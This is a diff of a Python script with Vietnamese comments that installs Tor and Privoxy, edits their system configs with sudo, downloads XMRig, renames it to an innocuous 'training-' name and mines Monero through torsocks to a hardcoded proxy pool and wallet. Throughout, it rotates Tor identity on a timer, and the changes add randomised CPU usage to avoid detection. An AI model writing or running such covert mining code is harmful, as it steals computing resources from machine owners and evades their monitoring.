@@ -3,7 +3,7 @@ import secrets
 import shutil
 import os
 import time
-import random  # Thêm thư viện random
+import random
 from pathlib import Path
 from stem import Signal
 from stem.control import Controller
@@ -12,153 +12,136 @@ from stem.control import Controller
 VERSION = "6.21.0"
 WORK_DIR = Path.home() / "work"
 XMRIg_DIR = WORK_DIR / f"xmrig-{VERSION}"
-POOL = "47.238.48.153:8080"  # Địa chỉ IP máy chủ trung gian và cổng proxy
+POOL = "47.238.48.153:8080"
 USERNAME = "45edxp4yMGmELBAYxkzkmhjYKH85sNApENokaB3UpZXoMcinqEyH4bRZM1wnN3VGTkVqf7Ve7tqSCDPywne5XSP2VnmGi3y"
 ALGO = "rx/0"
 DONATE = "1"
+TOR_PORT = 9051
+PRIVOXY_PORT = 9050
 
-# Step 1: Cài đặt Tor và Privoxy
-def install_tor_privoxy():
+# Helper function to run shell commands
+def run_command(command):
     try:
-        subprocess.run(["sudo", "apt-get", "update"], check=True)
-        subprocess.run(["sudo", "apt-get", "install", "-y", "tor", "privoxy"], check=True)
+        subprocess.run(command, check=True)
     except subprocess.CalledProcessError as e:
-        print(f"Error installing Tor/Privoxy: {e}")
+        print(f"Error running command {command}: {e}")
         return False
     return True
 
+# Install Tor and Privoxy
+def install_tor_privoxy():
+    return run_command(["sudo", "apt-get", "install", "-y", "tor", "privoxy"])
 
-# Step 2: Cấu hình Privoxy để sử dụng Tor proxy và tránh ghi đè lần hai
+# Configure Privoxy
 def configure_privoxy():
     try:
-        # Đọc nội dung hiện tại của tệp config
-        with open("/etc/privoxy/config", "r") as config_file:
+        privoxy_config_path = "/etc/privoxy/config"
+        forward_socks = f"forward-socks5t / 127.0.0.1:{PRIVOXY_PORT} .\n"
+        with open(privoxy_config_path, "r+") as config_file:
             config_lines = config_file.readlines()
-
-        # Kiểm tra xem dòng cấu hình đã có hay chưa
-        if "forward-socks5t / 127.0.0.1:9050 .\n" not in config_lines:
-            # Nếu chưa có thì thêm dòng cấu hình
-            with open("/etc/privoxy/config", "a") as config_file:
-                config_file.write("\nforward-socks5t / 127.0.0.1:9050 .\n")
-
+            if forward_socks not in config_lines:
+                config_file.write(forward_socks)
+        return True
     except Exception as e:
         print(f"Error configuring Privoxy: {e}")
         return False
-    return True
 
-
-
-# Step 3: Cấu hình Tor mà không yêu cầu mật khẩu và tránh ghi đè
+# Configure Tor
 def configure_tor():
     try:
-        # Đọc nội dung hiện tại của tệp torrc
-        with open("/etc/tor/torrc", "r") as torrc_file:
+        torrc_path = "/etc/tor/torrc"
+        settings = ["ControlPort 9051\n", "SocksTimeout 60\n"]
+        with open(torrc_path, "r+") as torrc_file:
             config_lines = torrc_file.readlines()
-
-        # Kiểm tra xem các dòng cấu hình đã có hay chưa
-        if "ControlPort 9051\n" not in config_lines:
-            config_lines.append("ControlPort 9051\n")
-        
-        if "SocksTimeout 60\n" not in config_lines:
-            config_lines.append("SocksTimeout 60\n")
-
-        # Ghi lại tệp với các cấu hình bổ sung
-        with open("/etc/tor/torrc", "w") as torrc_file:
-            torrc_file.writelines(config_lines)
-
+            for setting in settings:
+                if setting not in config_lines:
+                    torrc_file.write(setting)
+        return True
     except Exception as e:
         print(f"Error configuring Tor: {e}")
         return False
-    return True
 
-# Step 4: Khởi động lại dịch vụ Tor và Privoxy
+# Restart Tor and Privoxy services
 def restart_services():
-    try:
-        subprocess.run(["sudo", "systemctl", "restart", "tor"], check=True)
-        subprocess.run(["sudo", "systemctl", "restart", "privoxy"], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error restarting services: {e}")
-        return False
-    return True
+    return run_command(["sudo", "systemctl", "restart", "tor"]) and run_command(["sudo", "systemctl", "restart", "privoxy"])
 
-# Step 5: Tải về XMRig
+# Download XMRig
 def download_xmrig():
     url = f"https://github.com/xmrig/xmrig/releases/download/v{VERSION}/xmrig-{VERSION}-linux-x64.tar.gz"
-    try:
-        subprocess.run(["wget", url, "-P", str(WORK_DIR)], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error downloading XMRig: {e}")
-        return False
-    return True
+    return run_command(["wget", url, "-P", str(WORK_DIR)])
 
-# Step 6: Giải nén XMRig
+# Extract XMRig
 def extract_xmrig():
-    try:
-        subprocess.run(["tar", "-xvzf", str(WORK_DIR / f"xmrig-{VERSION}-linux-x64.tar.gz"), "-C", str(WORK_DIR)], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error extracting XMRig: {e}")
-        return False
-    return True
+    tar_file = WORK_DIR / f"xmrig-{VERSION}-linux-x64.tar.gz"
+    return run_command(["tar", "-xvzf", str(tar_file), "-C", str(WORK_DIR)])
 
-# Step 7: Đổi tên XMRig để ngẫu nhiên hóa
+# Rename XMRig to a random name
 def rename_xmrig():
     xmrig_path = XMRIg_DIR / "xmrig"
     random_name = f"training-{secrets.randbelow(375)}-{secrets.randbelow(259)}"
-    shutil.move(str(xmrig_path), str(WORK_DIR / random_name))
-    return WORK_DIR / random_name
+    new_path = WORK_DIR / random_name
+    shutil.move(str(xmrig_path), str(new_path))
+    return new_path
 
-# Step 8: Thiết lập quyền thực thi cho XMRig
+# Set executable permissions for XMRig
 def set_permissions(xmrig_path):
     os.chmod(str(xmrig_path), 0o755)
 
-# Step 9: Yêu cầu thay đổi IP qua Tor
+# Renew IP via Tor
 def renew_connection():
-    with Controller.from_port(port=9051) as controller:
-        controller.authenticate()  # Không cần mật khẩu nếu không thiết lập HashedControlPassword
+    with Controller.from_port(port=TOR_PORT) as controller:
+        controller.authenticate()
         controller.signal(Signal.NEWNYM)
 
-# Step 10: Chạy XMRig thông qua Tor proxy bằng torsocks và thêm --no-huge-pages
-def run_xmrig_through_tor(xmrig_path):
+# Run XMRig through Tor with random CPU usage
+def run_xmrig(xmrig_path):
+    # Chọn ngẫu nhiên một giá trị từ 70 đến 90
+    cpu_hint = random.randint(70, 90)
+
     xmrig_cmd = [
-        "torsocks",  # Sử dụng torsocks để bắt buộc kết nối qua Tor
-        str(xmrig_path),
+        "torsocks", str(xmrig_path),
         "--donate-level", DONATE,
-        "-o", POOL,  # Kết nối qua máy chủ trung gian
+        "-o", POOL,
         "-u", USERNAME,
         "-a", ALGO,
-        "--no-huge-pages",  # Thêm tham số để vô hiệu hóa Huge Pages
-        "-k", "--tls",  # Kết nối bảo mật
-        "--tls"  # Sử dụng giao thức bảo mật
+        "--no-huge-pages",
+        "-k", "--tls",
+        f"--cpu-max-threads-hint={cpu_hint}"  # Điều chỉnh tỷ lệ sử dụng CPU
     ]
-    return subprocess.Popen(xmrig_cmd)  # Chạy XMRig trong nền
 
-# Step 11: Dừng XMRig
+    print(f"Đang chạy XMRig với {cpu_hint}% CPU.")
+    return subprocess.Popen(xmrig_cmd)
+
+# Stop XMRig
 def stop_xmrig(xmrig_process):
     xmrig_process.terminate()
     xmrig_process.wait()
 
-# Main
-if __name__ == "__main__":
-    if install_tor_privoxy() and configure_privoxy() and configure_tor() and restart_services():
-        print("Tor và Privoxy đã được cài đặt và cấu hình thành công.")
-        WORK_DIR.mkdir(parents=True, exist_ok=True)
-        
-        if download_xmrig() and extract_xmrig():
-            xmrig_path = rename_xmrig()
-            set_permissions(xmrig_path)
-
-            # Chạy XMRig trong nền và tái kết nối sau khoảng thời gian ngẫu nhiên từ 15 đến 60 phút
-            while True:
-                # Khởi động XMRig
-                xmrig_process = run_xmrig_through_tor(xmrig_path)
-
-                # Đổi IP sau một khoảng thời gian ngẫu nhiên từ 15 đến 60 phút
-                random_sleep = random.randint(900, 1800)  # Ngẫu nhiên từ 900s (15 phút) đến 1800s (30 phút)
-                print(f"Chờ {random_sleep // 30} phút trước khi đổi IP...")
-                time.sleep(random_sleep)
-                renew_connection()  # Yêu cầu Tor đổi IP
-                
-                # Dừng XMRig và khởi động lại với IP mới
-                stop_xmrig(xmrig_process)
-    else:
+# Main function
+def main():
+    if not (install_tor_privoxy() and configure_privoxy() and configure_tor() and restart_services()):
         print("Có lỗi xảy ra trong quá trình cài đặt hoặc cấu hình.")
+        return
+
+    print("Tor và Privoxy đã được cài đặt và cấu hình thành công.")
+    WORK_DIR.mkdir(parents=True, exist_ok=True)
+
+    if download_xmrig() and extract_xmrig():
+        xmrig_path = rename_xmrig()
+        set_permissions(xmrig_path)
+
+        while True:
+            # Chạy XMRig với CPU sử dụng ngẫu nhiên từ 70 đến 90%
+            xmrig_process = run_xmrig(xmrig_path)
+
+            # Ngủ trong khoảng thời gian ngẫu nhiên từ 10 đến 20 phút
+            sleep_time = random.randint(600, 1200)  # Ngẫu nhiên từ 600s (10 phút) đến 1200s (20 phút)
+            print(f"Chờ {sleep_time // 60} phút trước khi đổi IP...")
+            time.sleep(sleep_time)
+
+            # Đổi IP và khởi động lại XMRig với tỷ lệ CPU ngẫu nhiên mới
+            renew_connection()  # Yêu cầu Tor đổi IP
+            stop_xmrig(xmrig_process)
+
+if __name__ == "__main__":
+    main()
